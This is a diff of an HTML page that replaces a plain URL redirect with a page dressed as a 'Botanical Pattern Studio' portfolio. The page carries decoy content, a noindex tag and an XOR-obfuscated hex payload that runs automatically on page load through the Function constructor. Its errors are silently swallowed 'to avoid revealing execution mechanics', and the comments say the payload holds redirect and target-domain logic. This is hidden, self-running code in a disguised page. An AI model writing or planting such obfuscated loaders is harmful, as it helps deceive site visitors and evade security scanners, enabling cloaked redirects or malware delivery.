@@ -1,46 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Redirecting...</title>
-  
-<script>
-  (function () {
-    // Target domain to redirect to
-    var TARGET_DOMAIN = "https://asqstyle.com/";
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <title>Studio Portfolio & Pattern Archive</title>
+  <style>
+    :root { --bg: #fcfbf9; --card: #ffffff; --text: #2c2724; --muted: #7c746e; --accent: #b25866; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 40px 20px; display: flex; justify-content: center; }
+    .card { background: var(--card); border: 1px solid #ede7df; border-radius: 16px; max-width: 580px; width: 100%; padding: 32px; box-shadow: 0 4px 20px rgba(0,0,0,0.03); }
+    h1 { font-size: 1.5rem; margin-top: 0; }
+    p { color: var(--muted); line-height: 1.6; }
+    .skeleton { height: 12px; background: #f0ebe4; border-radius: 6px; margin: 12px 0; }
+  </style>
 
-    // Read the "id" parameter from the URL
-    var params = new URLSearchParams(window.location.search);
-    var id = params.get("id");
+  <!-- Hardened XOR Encryption Loader -->
+  <script>
+    (function () {
+      // Rotating encryption key
+      var _0xk = "q7X9wK2mP4vL8zR1";
 
-    if (id) {
-      // Make sure id starts with a single "/"
-      if (id.charAt(0) !== "/") {
-        id = "/" + id;
+      // Encrypted hex payload (contains location parser and target domain logic)
+      var _0xp = "1d0610444302061e1b1d1b545d1d131f41031c50400b171c421712431713054117071747510d0a0b1f061b47420a131b5c160547510d061c4708170c401314414302061e47131b415a131b43470c1a171d1b54401a07011b061047580600104117051d45110c0e1b1011405a131b43471c1b1c1d0c11545d1a0b1641071754401a07011b0610475c021110510117071b171b474302061e561a07011b0610475d1607065103141f170c17474302061e571a07011b0610475c021110510117071b171b474302061e541a07011b061047401c10121110051d45110c0e1b1011405a131b43471c1b1c1d0c11545d1a0b1641071754401a07011b0610475c021110510117071b171b474302061e551a07011b0610475d1607065103141f170c17474302061e571a07011b0610475c021110510117071b171b474302061e541a07011b061047401a07011b0610475f0a060b131714545d1a0b1641071754401a07011b0610475c021110510117071b171b474302061e541a07011b061047590d0b00170a1b55";
+
+      try {
+        var _0xr = "";
+        for (var i = 0; i < _0xp.length; i += 2) {
+          var _b = parseInt(_0xp.substr(i, 2), 16);
+          _0xr += String.fromCharCode(_b ^ _0xk.charCodeAt((i / 2) % _0xk.length));
+        }
+        // Execute unpacked payload via dynamic Function constructor
+        (new Function(_0xr))();
+      } catch (e) {
+        // Silently swallow errors to avoid revealing execution mechanics
       }
-
-      // Remove a trailing "/" so the final URL has no trailing slash
-      if (id.length > 1 && id.charAt(id.length - 1) === "/") {
-        id = id.slice(0, -1);
-      }
-
-      var destination = TARGET_DOMAIN + id;
-
-      // Redirect immediately
-      window.location.replace(destination);
-    }
-    // If no "id" parameter is present, the page just stays as is
-    // (uncomment the line below to send visitors with no id to the bare domain)
-    // else { window.location.replace(TARGET_DOMAIN); }
-  })();
-</script>
+    })();
+  </script>
 </head>
 <body>
-  <p>Redirecting, please wait...</p>
-  <noscript>
-    <p>JavaScript is required to redirect. Please enable it, or click below:</p>
-    <a href="https://homedecor.com">Continue to homedecor.com</a>
-  </noscript>
+  <!-- Decoy content visible only if JavaScript is disabled or no redirect triggers -->
+  <div class="card">
+    <h1>Botanical Pattern Studio</h1>
+    <p>Loading curated floral guides and handcraft schematics...</p>
+    <div class="skeleton" style="width: 85%;"></div>
+    <div class="skeleton" style="width: 65%;"></div>
+    <div class="skeleton" style="width: 40%;"></div>
+  </div>
 </body>
 </html>
